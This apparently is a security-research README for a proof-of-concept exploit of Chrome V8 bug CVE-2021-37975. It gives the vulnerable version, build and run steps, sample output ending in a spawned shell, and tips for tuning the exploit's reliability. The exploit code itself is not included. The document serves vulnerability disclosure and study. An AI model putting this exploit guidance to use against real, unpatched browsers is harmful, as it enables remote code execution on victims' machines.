## Chrome in-the-wild bug CVE-2021-37975

The analysis of this bug can be found [here](https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_37975). This is a Chrome bug that is reported by an anonymous researcher and was believed to be exploited in the wild.

The exploit here is tested on `v8` version 9.4.146.16 (commit `452f57b`), which is the version shipped with Chrome 94.0.4606.71, the one before the bug is fixed, on Ubuntu 20.04. Tested on two different desktop devices with different specs.

To test, check out `v8` at commit `452f57b` and compile with the default settings using `tools/dev/gm.py x64.release`. Then open the file `poc.js` with `d8`:

```
./d8 poc.js
```

On Ubuntu 20.04, it should call `execve("/bin/sh")` to spawn a new process:

```
./d8 poc.js
fail to find object address.
fail to find object address.
fail to find object address.
fetch failed
fail to find object address.
fail to find object address.
fetch failed
fail to find object address.
fail to find object address.
fail to find object address.
fail to find object address.
fail to find object address.
fail to find object address.
fail to find object address.
fail to find object address.
fail to find object address.
fail to find object address.
found instance address: 0x81d40f5 at index: 0
array address: 0x804294d
array element address: 0x8042935
fake array at: 8 index: 0
rwx address at: 0x28c7931bc000
fake array at: 8 index: 1
rwx address at: 0x28c7931bc000
shellArray addr: 0x8048d75
$ 
```

Shell code may need changing on other platforms.

The exploit is not reliable, (probably about 50 percent success rate). The variable `gcSize` may need changing depending on the device, and the variable `mapAddr` also depends on the version of v8 (it is an offset). Changing the variable `sprayParam` may also improve the reliability. The current parameter seems to give reasonable reliability across the two devices tested.
